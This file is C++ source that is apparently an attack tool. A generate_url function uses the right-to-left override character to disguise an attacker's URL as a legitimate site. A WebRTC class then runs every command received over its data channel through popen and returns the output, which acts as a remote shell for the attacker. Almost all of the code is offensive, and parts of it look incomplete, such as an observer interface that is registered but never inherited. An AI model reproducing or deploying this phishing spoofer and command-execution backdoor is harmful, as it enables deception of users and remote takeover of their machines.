#include <iostream>
#include <string>
#include <thread>
#include <csignal>
#include <webrtc/api/peer_connection_interface.h>
#include <webrtc/api/create_peerconnection_factory.h>
#include <webrtc/rtc_base/thread.h>
#include <webrtc/rtc_base/logging.h>
#include <signal_protocol.h>

void generate_url(const std::string &legitimate_website, const std::string &attack_website) {
    std::wstring _RTLO = L"\u202e";
    std::string _LEGWEB = legitimate_website.find("https://") != std::string::npos
                          ? std::string(legitimate_website.rbegin(), legitimate_website.rend())
                          : "https://" + std::string(legitimate_website.rbegin(), legitimate_website.rend());
    std::string _ATTWEB = attack_website;
    _ATTWEB.erase(0, 8);  // remove "https://"
    std::wcout << L' ' << _RTLO << std::wstring(_ATTWEB.begin(), _ATTWEB.end()) + L"#/" + std::wstring(_LEGWEB.begin(), _LEGWEB.end()) << std::endl;
}

class DummySetSessionDescriptionObserver : public webrtc::SetSessionDescriptionObserver {
public:
    static DummySetSessionDescriptionObserver* Create() {
        return new rtc::RefCountedObject<DummySetSessionDescriptionObserver>();
    }
    void OnSuccess() override {
        std::cout << "Set session description success." << std::endl;
    }
    void OnFailure(webrtc::RTCError error) override {
        std::cerr << "Failed to set session description: " << error.message() << std::endl;
    }
};

class WebRTCConnection : public webrtc::PeerConnectionObserver,
                         public webrtc::CreateSessionDescriptionObserver {
public:
    WebRTCConnection() {
        network_thread = rtc::Thread::CreateWithSocketServer();
        worker_thread = rtc::Thread::Create();
        signaling_thread = rtc::Thread::Create();

        network_thread->Start();
        worker_thread->Start();
        signaling_thread->Start();

        factory = webrtc::CreatePeerConnectionFactory(
            network_thread.get(), worker_thread.get(), signaling_thread.get(), nullptr,
            webrtc::CreateBuiltinAudioEncoderFactory(), webrtc::CreateBuiltinAudioDecoderFactory(),
            webrtc::CreateBuiltinVideoEncoderFactory(), webrtc::CreateBuiltinVideoDecoderFactory(), nullptr, nullptr);

        if (!factory) {
            throw std::runtime_error("Failed to create PeerConnectionFactory");
        }
    }

    void create_offer() {
        webrtc::PeerConnectionInterface::RTCConfiguration config;
        peer_connection = factory->CreatePeerConnection(config, nullptr, nullptr, this);

        if (!peer_connection) {
            throw std::runtime_error("Failed to create PeerConnection");
        }

        webrtc::DataChannelInit init;
        data_channel = peer_connection->CreateDataChannel("data", &init);

        if (!data_channel) {
            throw std::runtime_error("Failed to create DataChannel");
        }

        peer_connection->CreateOffer(this, webrtc::PeerConnectionInterface::RTCOfferAnswerOptions());
    }

    void OnSuccess(webrtc::SessionDescriptionInterface* desc) override {
        peer_connection->SetLocalDescription(DummySetSessionDescriptionObserver::Create(), desc);
        std::string sdp;
        desc->ToString(&sdp);
        std::cout << "Created SDP offer: " << sdp << std::endl;
        // Send SDP offer via Signal
    }

    void OnFailure(webrtc::RTCError error) override {
        std::cerr << "Failed to create SDP offer: " << error.message() << std::endl;
    }

    void OnDataChannel(rtc::scoped_refptr<webrtc::DataChannelInterface> channel) override {
        data_channel = channel;
        data_channel->RegisterObserver(this);
    }

    void OnMessage(const webrtc::DataBuffer& buffer) override {
        std::string command(buffer.data.data<char>(), buffer.data.size());
        std::cout << "Received command: " << command << std::endl;

        std::string result;
        char buffer_output[128];
        FILE* pipe = popen(command.c_str(), "r");
        if (!pipe) throw std::runtime_error("popen() failed!");
        try {
            while (fgets(buffer_output, sizeof buffer_output, pipe) != nullptr) {
                result += buffer_output;
            }
        } catch (...) {
            pclose(pipe);
            throw;
        }
        pclose(pipe);
        data_channel->Send(webrtc::DataBuffer(rtc::CopyOnWriteBuffer(result.c_str(), result.size())));
    }

private:
    rtc::scoped_refptr<webrtc::PeerConnectionFactoryInterface> factory;
    rtc::scoped_refptr<webrtc::PeerConnectionInterface> peer_connection;
    rtc::scoped_refptr<webrtc::DataChannelInterface> data_channel;
    std::unique_ptr<rtc::Thread> network_thread;
    std::unique_ptr<rtc::Thread> worker_thread;
    std::unique_ptr<rtc::Thread> signaling_thread;
};

int main(int argc, char *argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <legitimate_website> <attack_website>\n";
        return 1;
    }

    std::string legitimate_website = argv[1];
    std::string attack_website = argv[2];

    generate_url(legitimate_website, attack_website);

    try {
        WebRTCConnection webrtc_connection;
        webrtc_connection.create_offer();
    } catch (const std::exception &e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    // Keep the application running to maintain WebRTC connection
    std::this_thread::sleep_for(std::chrono::hours(1));
    return 0;
}
